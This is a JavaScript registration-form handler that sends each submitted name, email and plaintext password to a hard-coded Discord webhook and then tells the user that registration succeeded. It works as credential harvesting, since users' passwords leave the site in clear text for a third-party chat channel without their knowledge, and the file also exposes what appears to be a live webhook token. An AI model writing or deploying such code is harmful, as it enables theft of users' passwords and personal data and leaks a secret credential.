document.addEventListener("DOMContentLoaded", function () {
    const registerForm = document.getElementById("registerForm");
    const registerStatus = document.getElementById("registerStatus");
  
    registerForm.addEventListener("submit", function (event) {
      event.preventDefault();
  
      const name = document.getElementById("name").value;
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
  
      // Construct the payload to send to the Discord webhook
      const payload = {
        content: `New registration:\nName: ${name}\nEmail: ${email}\nPassword: ${password}`
      };
  
      // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
      const webhookURL = 'https://discord.com/api/webhooks/1178252049041858600/NImAZJvRyUP09OmLXNLLBWSKLN9u6srPMQp0lI8b-oeUkmzsDgDT5vaXeINEnvGc2EzN';
  
      // Send the payload to the Discord webhook using fetch
      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      })
      .then(response => {
        if (response.ok) {
          registerStatus.textContent = "Registration successful!";
          registerForm.reset();
        } else {
          registerStatus.textContent = "Failed to register. Please try again.";
        }
      })
      .catch(error => {
        registerStatus.textContent = "An error occurred. Please try again later.";
        console.error('Error:', error);
      });
    });
  });
  